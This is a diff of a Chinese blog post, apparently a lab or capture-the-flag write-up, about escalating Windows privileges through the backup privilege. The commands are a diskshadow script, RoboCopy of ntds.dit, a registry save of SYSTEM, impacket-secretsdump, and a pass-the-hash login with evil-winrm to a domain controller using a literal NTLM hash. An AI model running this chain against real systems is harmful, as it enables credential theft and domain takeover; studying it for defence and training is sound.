-<h3 id="卷影拷贝"><a href="#卷影拷贝" class="headerlink" title="卷影拷贝"></a>卷影拷贝</h3><p>有备份以及还原文件或目录的权限，可以卷影拷贝然后读sam(SAM是安全账户管理器数据库，包含了本地用户及用户组,包括它们的口令及其他属性，位于注册表的HKLM**SAM下面)</p>
-<p>本地创建一个raj.dsh</p>
+
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/image-20250319125014237.png" srcset="/img/loading.gif" lazyload></p>
+<p>有备份以及还原文件和目录的权限，</p>
+<p>可以卷影拷贝然后读sam（ntds.dit) 和 system</p>
+<blockquote>
+<p>SAM是安全账户管理器数据库，包含了本地用户及用户组,包括它们的口令及其他属性，位于注册表的HKLM\SAM下面</p>
+<p><code>ntds.dit</code> 是 Windows 域控制器中存储 Active Directory 数据库的文件，包含域内所有用户、计算机、组等信息，以及用户的密码哈希（NTLM 和 Kerberos 密钥）。</p>
+<p><code>SYSTEM</code> 是 Windows 系统中的一个注册表文件，包含加密 <code>ntds.dit</code> 文件所需的密钥信息（称为 BootKey）。</p>
+</blockquote>
+<h3 id="卷影拷贝"><a href="#卷影拷贝" class="headerlink" title="卷影拷贝"></a>卷影拷贝</h3><p>本地创建一个raj.dsh</p>
 <p>写入</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> raj<br>create<br>expose %raj% z:<br></code></pre></td></tr></table></figure>
 
@@ -433,17 +451,17 @@
 
 
 
-<p><img src="/../../themes/fluid/source/img/image-20250319125323258.png" srcset="/img/loading.gif" lazyload alt="image-20250319125323258"></p>
+<p><img src="/img/image-20250319125323258.png" srcset="/img/loading.gif" lazyload></p>
 <p>Windows根目录创建文件夹 上传raj.dsh</p>
-<p><img src="/../../themes/fluid/source/img/image-20250319125511623.png" srcset="/img/loading.gif" lazyload alt="image-20250319125511623"></p>
+<p><img src="/img/image-20250319125511623.png" srcset="/img/loading.gif" lazyload></p>
 <p>卷影拷贝</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">diskshadow /s raj.dsh<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319125924915.png" srcset="/img/loading.gif" lazyload alt="image-20250319125924915"></p>
-<p>复制到到当前目录，也就是我们创建的这个test目录</p>
+<p><img src="/img/image-20250319125924915.png" srcset="/img/loading.gif" lazyload></p>
+<p>复制到到当前目录，也就是我们创建的这个目录</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">RoboCopy /b z:\windows\ntds . ntds.dit<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319130801039.png" srcset="/img/loading.gif" lazyload alt="image-20250319130801039"></p>
+<p><img src="/img/image-20250319130801039.png" srcset="/img/loading.gif" lazyload></p>
 <p>下载sam和system</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">download ntds.dit<br></code></pre></td></tr></table></figure>
 
@@ -452,15 +470,18 @@
 <p>下载system</p>
 <figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">reg <span class="hljs-keyword">save</span> HKLM\<span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">system</span><br>download <span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319131952859.png" srcset="/img/loading.gif" lazyload alt="image-20250319131952859"></p>
+<p><img src="/img/image-20250319131952859.png" srcset="/img/loading.gif" lazyload></p>
 <p>最后用download下来的ntds.dit和system本地进行解密</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-secretsdump -ntds ntds.dit -system system <span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319132952886.png" srcset="/img/loading.gif" lazyload alt="image-20250319132952886"></p>
+<p><img src="/img/image-20250319132952886.png" srcset="/img/loading.gif" lazyload></p>
 <p>PTH拿下域控</p>
+<blockquote>
+<p><strong>PTH</strong> 是 <strong>Pass-the-Hash</strong> 的缩写，是一种利用 Windows 系统中存储的 <strong>NTLM 哈希</strong>（或 <strong>Kerberos 密钥</strong>）进行身份验证的攻击技术。与传统的密码认证不同，PTH 攻击不需要知道用户的明文密码，而是直接使用密码哈希进行认证。</p>
+</blockquote>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> evil-winrm -i <span class="hljs-number">172.22.14.11</span> -u Administrator -H <span class="hljs-string">&quot;70c39b547b7d8adec35ad7c09fb1d277&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319133031208.png" srcset="/img/loading.gif" lazyload alt="image-20250319133031208"></p>
+<p><img src="/img/image-20250319133031208.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
